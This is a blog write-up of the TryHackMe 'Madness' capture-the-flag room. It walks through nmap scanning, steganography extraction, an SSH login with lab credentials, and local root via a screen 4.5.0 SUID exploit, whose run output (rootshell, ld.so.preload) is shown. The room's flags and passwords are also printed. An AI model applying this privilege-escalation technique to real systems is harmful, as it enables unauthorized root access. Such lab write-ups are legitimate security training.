---
title: "Madness - TryHackMe"
author: Ludovic COULON
date: 2020-05-15
hero: ./images/hero.png
excerpt: "Writeup for the Madness room on TryHackMe"
---

[TryHackMe | Madness](https://tryhackme.com/room/madness)

![https://i.imgur.com/5iW7kC8.jpg](https://i.imgur.com/5iW7kC8.jpg)

Please note this challenge does not require SSH brute forcing.

Use your skills to access the user and root account!

This room is part of the Turmoil series

### Setup

```bash
➜  TryHackMe nmap -A -vv 10.10.52.214
```

```bash
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnNdHQKU4ZvpWn7Amdx7LPhuwUsHY8p1O8msRAEkaIGcDzlla2FxdlnCnS1h+A84lzn1oubZyb5vMrPM8T2IsxoSU2gcbbgfq/3giAL+hmuKm/nD43OKRflSHlcpIVgwQOVRdEfbQSOVpV5VBtJziA1Xu2dts2WWtawDS93CBtlfyeh+BuxZvBPX2k8XPWwykyR6cWbdGz1AAx6oxNRvNShJ99c9Vs7FW6bogwLAe9SWsFi2oB7ti6M/OH1qxgy7ZPQFhItvI4Vz2zZFGVEltL1fkwk2dat8yfFNWwm6+/cMTJqbVb7MPt3jc9QpmJmpgwyWuy4FTNgFt9GKNOJU6N
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGMMalsXVdAFj+Iu4tESrnvI/5V64b4toSG7PK2N/XPqOe3q3z5OaDTK6TWo0ezdamfDPem/UO9WesVBxmJXDkE=
|   256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB3zGVeEQDBVK50Tz0eNWzBJny6ddQfBb3wmmG3QtMAQ

80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

### #1 user.txt

<div className="Image__Small">
  <img src="https://imgur.com/41PScB3.png" alt="blog_image" />
</div>

On the website in the source code we can see "They will never find me" let's wget the image and search if there is anything in there.

Once you open the image an error will show up, we need to convert the header image to a jpg file

<div className="Image__Small">
  <img src="https://imgur.com/zdz5gC1.png" alt="blog_image" />
</div>

```bash
change the first line to this
```

<div className="Image__Small">
  <img src="https://imgur.com/PklK0ei.png" alt="blog_image" />
</div>

Save the hex file and open the image to seethe result !

<div className="Image__Small">
  <img src="https://imgur.com/GrcsvaS.png" alt="blog_image" />
</div>

Nice we have a hidden directory !

<div className="Image__Small">
  <img src="https://imgur.com/01jTS9C.png" alt="blog_image" />
</div>

<div className="Image__Small">
  <img src="https://imgur.com/9D3EgD5.png" alt="blog_image" />
</div>

Now we have plainly of possibility to resolve this puzzle I've choose the simpler one

I created a list with python

```bash
>>> range(100)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99]
```

Then a imported this list in burp suite and I started the attack !

<div className="Image__Medium">
  <img src="https://imgur.com/ABpS7HJ.png" alt="blog_image" />
</div>

Now we can extract some files on the "thm.jpg" image from the apache website.

```bash
➜  TryHackMe steghide extract -sf thm.jpg
Enter passphrase:
the file "hidden.txt" does already exist. overwrite ? (y/n) y
wrote extracted data to "hidden.txt".

➜  TryHackMe cat hidden.txt
Fine you found the password!

Here's a username

wbxre

I didn't say I would make it easy for you!
```

After reading the hint given by TryHackMe

```bash
There's something ROTten about this guys name!
```

I tried to decode the username using the ROT13 algo

<div className="Image__Medium">
  <img src="https://imgur.com/Qn5keAi.png" alt="blog_image" />
</div>

And it worked !! Let's ssh the server now with the username and password

```bash
ssh joker@ip
password : y2RPJ4QaPF!B
```

Aaaannd it's not working for some reason.. After some time I tried the image on the room

<div className="Image__Small">
  <img src="https://imgur.com/P13mnW4.png" alt="blog_image" />
</div>

```bash
➜  TryHackMe steghide extract -sf 5iW7kC8.jpg
Enter passphrase:
the file "password.txt" does already exist. overwrite ? (y/n) y
wrote extracted data to "password.txt".

➜  TryHackMe cat password.txt
I didn't think you'd find me! Congratulations!

Here take my password

"*axA&GF8dP"
```

```bash
➜  TryHackMe ssh joker@10.10.52.214
joker@10.10.52.214's password: "*axA&GF8dP"
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Thu May 14 15:00:54 2020 from 10.9.2.228
joker@ubuntu:~$ ls
user.txt
joker@ubuntu:~$ cat user.txt
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

### #2 root.txt

Now let's get a root access ! :D

```bash
joker@ubuntu:~$ sudo -l
[sudo] password for joker:
Sorry, user joker may not run sudo on ubuntu.
# Nothing to do with sudo :/
```

```bash
joker@ubuntu:~$ find /bin -perm -4000
/bin/fusermount
/bin/su
/bin/ping6
"/bin/screen-4.5.0"
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount
joker@ubuntu:~$
```

[Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/41154)

```bash
joker@ubuntu:~$ bash s.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^
/usr/bin/ld: cannot open output file /tmp/rootshell: Permission denied
collect2: error: ld returned 1 exit status
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-joker.

$ id
uid=0(root) gid=0(root) groups=0(root),1000(joker)
$ cd /root/
$ ls
root.txt
$ cat root.txt
THM{5ecd98aa66a6abb670184d7547c8124a}
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/p0h00A1.png" alt="TryhackMeProfile" />
  </a>
</center>
